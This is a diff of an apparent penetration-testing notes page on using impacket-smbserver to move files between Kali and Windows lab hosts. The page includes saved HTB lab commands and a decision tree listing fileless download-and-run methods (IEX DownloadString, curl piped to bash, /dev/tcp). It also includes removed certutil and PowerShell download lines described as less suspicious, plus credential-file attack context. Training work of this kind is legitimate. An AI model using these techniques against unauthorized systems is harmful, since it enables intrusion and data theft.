@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/smbserver.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Serve a dedicated authenticated transfer directory
+[Search this tool’s saved examples](/commands/notebook?tool=smbserver) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Serve a dedicated authenticated transfer directory
 
 **Run in:** Kali. **Requires:** A dedicated folder, a free SMB listening port and a Windows client that can reach Kali; choose a temporary transfer credential.
 
@@ -22,137 +30,9 @@ mkdir -p ./transfer
 sudo impacket-smbserver share ./transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
 ```
 
-**Read the result:** Verify the share name, served directory and incoming connection, then confirm the requested file on both ends.
-
-**If Windows reaches the host but refuses the share connection:** Choose a directory intentionally; SMB client policy, authentication and port reachability can prevent transfers even when the server is listening.
+**What the result establishes:** Verify the share name, served directory and incoming connection, then confirm the requested file on both ends.
 
 **Next check:** Check existing Windows connections, credentials and SMB policy, then copy a small file before transferring the required artifact.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## smbserver.py: choose the operation and read the result
-
-Serve a local folder as an SMB share.
-
-### What the result establishes
-
-Verify the share name, served directory and incoming connection, then confirm the requested file on both ends.
-
-### Prerequisites and common failures
-
-Choose a directory intentionally; SMB client policy, authentication and port reachability can prevent transfers even when the server is listening.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-mkdir -p ~/transfer
-sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
-```
-
-### Example 2: SMB Downloads
-
-Run in: **Saved lab example**.
-
-```bash
-sudo impacket-smbserver share -smb2support /tmp/smbshare
-```
-
-Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: SMB Downloads
-
-Run in: **Saved lab example**.
-
-```bash
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
-```
-
-Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: SMB Downloads
-
-Run in: **Saved lab example**.
-
-```bash
-impacket-smbserver CompData /tmp/loot -smb2support -username grcan -password grcan123
-```
-
-Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: SMB Downloads
-
-Run in: **Saved lab example**.
-
-```zsh
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/rdp-share
-```
-
-Saved context: [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Quick Decision Tree
-
-Run in: **Saved lab example**.
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: 11. Attacking SAM, SYSTEM & SECURITY
-
-Run in: **Saved lab example**.
-
-```bash
-# attacker:
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/you/Documents/
-```
-
-Saved context: [Password Attacks: Cracking, Files, and Credential Stores — 11. Attacking SAM, SYSTEM & SECURITY](/password-attacks/password-attacks-cheat-sheet#11-attacking-sam-system-&-security). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Serve a local folder as an SMB share.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=smbserver) · [All tools](/index)
 
 ## Commands
 
@@ -163,11 +43,15 @@ mkdir -p ~/transfer
 sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Windows reaches the host but refuses the share connection | Choose a directory intentionally; SMB client policy, authentication and port reachability can prevent transfers even when the server is listening. |
 
 ## Notebook recipes
 
-13 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -231,6 +115,33 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 </Accordion>
 
+<Accordion title="SMB">
+
+### SMB
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — SMB](/web/htb/file-inclusion#smb)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Quick Decision Tree">
 
 ### Quick Decision Tree
@@ -267,7 +178,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -352,33 +263,6 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support 
 
 </Accordion>
 
-<Accordion title="Downloading TO a Windows target">
-
-### Downloading TO a Windows target
-
-**Pivoting and File Transfer: Field Reference**
-
-```powershell
-# PowerShell
-Invoke-WebRequest http://172.16.119.13:8080/tool.exe -OutFile C:\Users\Public\tool.exe
-# certutil (lives on every Windows box, less suspicious filename-wise)
-certutil -urlcache -split -f http://172.16.119.13:8080/tool.exe C:\Users\Public\tool.exe
-# SMB (impacket smbserver on a reachable host):
-copy \\172.16.119.13\share\tool.exe C:\Users\Public\
-# RDP drive redirect — no server at all:
-#   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
-copy \\tsclient\kali\tool.exe C:\Users\Public\
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Pulling files FROM the target to Kali (the hard direction)">
 
 ### Pulling files FROM the target to Kali (the hard direction)
@@ -416,48 +300,6 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 
 </Accordion>
 
-<Accordion title="11. File transfer over a pivot">
-
-### 11. File transfer over a pivot
-
-**Active Directory Attack Path: Worked Lab**
-
-Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
-
-```text
-proxychains impacket-smbserver
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot) · [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Impacket: Script Quick Reference">
-
-### Impacket: Script Quick Reference
-
-**Impacket: Script Quick Reference**
-
-Context from the notebook: SMB client / local server smbclient.py ,  smbserver.py  /  impacket-smbclient ,  impacket-smbserver SMB  ·  Transfers
-
-```text
-smbserver.py
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Creating a Share with smbserver.py">
 
 ### Creating a Share with smbserver.py
@@ -488,6 +330,10 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -495,5 +341,3 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
